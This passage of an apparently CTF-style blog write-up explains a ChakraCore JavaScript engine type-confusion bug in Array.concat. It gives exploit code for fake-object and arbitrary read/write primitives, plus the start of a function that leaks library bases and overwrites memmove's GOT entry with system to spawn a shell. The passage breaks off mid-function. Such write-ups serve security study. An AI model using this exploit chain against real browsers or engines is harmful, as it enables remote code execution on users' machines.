&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;a1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[];&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;a2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;lower&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;upper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// addr = arbitrary address&lt;/span&gt;


    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;Symbol&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;species&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;new_array&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[];&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;new_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;constructor&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;nx&quot;&gt;a2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;__defineGetter__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;Symbol&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;isConcatSpreadable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;new_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{};&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;

    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;concat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x100&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// res[128] = an object @ addr&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here when &lt;code class=&quot;highlighter-rouge&quot;&gt;var res = a1.concat(a2);&lt;/code&gt; was executed, the ChakraCore engine will ran to line &lt;a href=&quot;https://github.com/Microsoft/ChakraCore/blob/dd33b4ceaf4b38b44d279d13988ecbd31df46ed2/lib/Runtime/Library/JavascriptArray.cpp#L3176&quot;&gt;3176&lt;/a&gt;:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bool converted = CopyNativeIntArrayElements(pDestArray, idxDest, pItemArray);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here &lt;code class=&quot;highlighter-rouge&quot;&gt;pDestArray&lt;/code&gt; is &lt;strong&gt;“suppose”&lt;/strong&gt; to be a &lt;code class=&quot;highlighter-rouge&quot;&gt;JavscriptNativeIntAarray&lt;/code&gt;, but again, we pass the argument as a &lt;code class=&quot;highlighter-rouge&quot;&gt;JavascriptArray&lt;/code&gt; data type instead, causing the type confusion vulnerability.&lt;/p&gt;

&lt;p&gt;Later the lower part and the upper part of the address ( &lt;code class=&quot;highlighter-rouge&quot;&gt;a2[0]&lt;/code&gt; &amp;amp; &lt;code class=&quot;highlighter-rouge&quot;&gt;a2[1]&lt;/code&gt; ) will be appended into &lt;code class=&quot;highlighter-rouge&quot;&gt;pDestArray&lt;/code&gt; ( in the form of &lt;code class=&quot;highlighter-rouge&quot;&gt;int32&lt;/code&gt; ). The memory layout of &lt;code class=&quot;highlighter-rouge&quot;&gt;res&lt;/code&gt; array will become:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.......................
0x00007ffff02d8408│+0x10: 0x000100000000007e  &amp;lt;-- res[126]
0x00007ffff02d8410│+0x18: 0x000100000000007f  &amp;lt;-- res[127]
0x00007ffff02d8418│+0x20: 0x00007ffff03d84f0  &amp;lt;-- res[128]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Due to type confusion, now &lt;code class=&quot;highlighter-rouge&quot;&gt;res&lt;/code&gt; will be treated as &lt;code class=&quot;highlighter-rouge&quot;&gt;JavascriptArray&lt;/code&gt; and think that &lt;code class=&quot;highlighter-rouge&quot;&gt;res[128]&lt;/code&gt; is an object ( which its address = &lt;code class=&quot;highlighter-rouge&quot;&gt;0x00007ffff03d84f0&lt;/code&gt; ). By returning &lt;code class=&quot;highlighter-rouge&quot;&gt;res[128]&lt;/code&gt; we now have the fake object’s handle.&lt;/p&gt;

&lt;h3 id=&quot;arbitrary-readwrite-primitive&quot;&gt;arbitrary read/write primitive&lt;/h3&gt;

&lt;p&gt;The exploit code first fake an &lt;code class=&quot;highlighter-rouge&quot;&gt;Uint32Array&lt;/code&gt; object, then modify its data buffer’s pointer to obtain the arbitrary read/write primitive. To fake an &lt;code class=&quot;highlighter-rouge&quot;&gt;Uint32Array&lt;/code&gt; object, it will need:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Address of &lt;code class=&quot;highlighter-rouge&quot;&gt;Uint32Array&lt;/code&gt;’s vtable.&lt;/li&gt;
  &lt;li&gt;A pointer point to &lt;code class=&quot;highlighter-rouge&quot;&gt;0x30&lt;/code&gt; ( &lt;code class=&quot;highlighter-rouge&quot;&gt;Uint32Array&lt;/code&gt;’s type id. Check &lt;a href=&quot;https://github.com/Microsoft/ChakraCore/blob/master/lib/Runtime/Types/EdgeJavascriptTypeId.h&quot;&gt;this link&lt;/a&gt; for more information )&lt;/li&gt;
  &lt;li&gt;A fake size&lt;/li&gt;
  &lt;li&gt;An &lt;code class=&quot;highlighter-rouge&quot;&gt;ArrayBuffer&lt;/code&gt;’s address&lt;/li&gt;
  &lt;li&gt;A fake data buffer pointer&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;From the exploit code we can see it use &lt;code class=&quot;highlighter-rouge&quot;&gt;Array&lt;/code&gt; to fake those data:&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;...................&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;real&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;real_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;addrof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;real&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// fake vtable pointer&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;real&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;lower&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;uint_vtable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 
&lt;span class=&quot;nx&quot;&gt;real&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;upper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;uint_vtable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// fake type pointer&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;real&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;lower&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;array_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;real&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;upper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;array_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// dont care&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;real&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;real&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;real&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;real&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// fake size&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;real&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;real&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// fake ArrayBuffer pointer&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;real&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;lower&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ab_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;real&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;upper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ab_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// dont care&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;real&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;real&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As for read/write primitive, it first assign the address in &lt;code class=&quot;highlighter-rouge&quot;&gt;real[14]&lt;/code&gt; &amp;amp; &lt;code class=&quot;highlighter-rouge&quot;&gt;real[15]&lt;/code&gt; to modify the data buffer’s pointer, then use &lt;code class=&quot;highlighter-rouge&quot;&gt;fakeobj&lt;/code&gt; to obtain the handle of the fake &lt;code class=&quot;highlighter-rouge&quot;&gt;Uint32Array&lt;/code&gt; object:&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;c1&quot;&gt;// the following creates an object which we will use to read and write&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// memory arbitrarily&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;memory&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;handle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fakeobj&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;real_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x58&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// return fake object&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;// we set the buffer pointer of the fake Uint32Array to the &lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;// target address&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;real&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;lower&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;real&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;upper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

            &lt;span class=&quot;c1&quot;&gt;// Now get a handle to the fake object!&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;memory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;handle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Later it can just use the fake object handle to read/write the memory content.&lt;/p&gt;

&lt;h3 id=&quot;getting-shell&quot;&gt;getting shell&lt;/h3&gt;

&lt;p&gt;Here I modified the exploit code and use the same exploit method as the feuerfuchs challenge to get the shell:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Leak the base address of &lt;code class=&quot;highlighter-rouge&quot;&gt;libChakraCore.so&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Get the base address of &lt;code class=&quot;highlighter-rouge&quot;&gt;libc.so&lt;/code&gt; by leaking &lt;code class=&quot;highlighter-rouge&quot;&gt;write@got.plt&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Overwrite &lt;code class=&quot;highlighter-rouge&quot;&gt;memmove@got.plt&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Execute &lt;code class=&quot;highlighter-rouge&quot;&gt;system([cmd])&lt;/code&gt; by calling &lt;code class=&quot;highlighter-rouge&quot;&gt;Uint8Array.set()&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pwn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// exploit the bug and create our arbitrary r/w primitive&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mem&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;gimme_rw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// get the base of libChakraCore.so                                                                                                                                                                     &lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;get_base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;[+] base @ &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// the following offets are hardcoded&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;memmove_got&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xd9b0f0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;[+] memmove_got @ &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;memmove_got&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;write_got&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xd9b780&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
